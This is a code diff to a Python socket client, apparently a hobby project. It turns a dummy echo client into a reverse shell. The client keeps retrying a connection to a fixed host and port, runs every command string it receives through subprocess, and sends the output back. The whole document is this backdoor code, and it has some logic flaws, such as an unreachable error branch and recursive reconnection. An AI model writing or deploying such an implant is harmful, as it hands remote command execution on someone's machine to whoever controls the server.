@@ -1,5 +1,6 @@
 import socket
 import time
+import subprocess
 
 
 class Client:
@@ -18,17 +19,23 @@ class Client:
         while True:
             try:
                 # tries to connect to the server
-                self.sock.connect(('benju', 5555))
+                self.sock.connect(('127.0.1.1', 23164))
                 print("[+] Connection established")
                 self.shell()
                 # it breaks the loop if I can connect since no error has been thrown
                 break
-            except:
-                # if it throws an error then rerun the function
+            except ConnectionRefusedError as e:
+                print(f'[{e.errno}] Couldn\'t connect to host.')
                 self.connection()
-            finally:
+            except PermissionError as e:
+                print(f'[{e.errno}] Connection with host interrupted by the host.')
                 self.sock.close()
-                print('Socket is closed.')
+                self.create_socket()
+            except OSError as e:
+                print(f'[{e.errno}] Already connected to host.')
+                self.sock.close()
+                self.create_socket()
+        print('Closed.')
 
     def shell(self):
         """
@@ -36,10 +43,25 @@ class Client:
         """
         while True:
             data = self.sock.recv(1024)
-            if data.decode('utf-8') == 'ter':
+            data = data.decode('utf-8')
+            if data == 'terminate':
                 break
-            print(data.decode('utf-8'))
-            self.sock.sendall('Dummy response from the client... :0)'.encode('utf-8'))
+            shell_result = subprocess.run(
+                data.split(' '),
+                capture_output=True,
+                check=True
+            )
+            if shell_result.returncode == 0:
+                print('no error')
+                self.sock.sendall(shell_result.stdout)
+            else:
+                print('error caught')
+
+                self.sock.sendall(shell_result.stderr)
+
+    def create_socket(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection()
 
 
 if __name__ == '__main__':
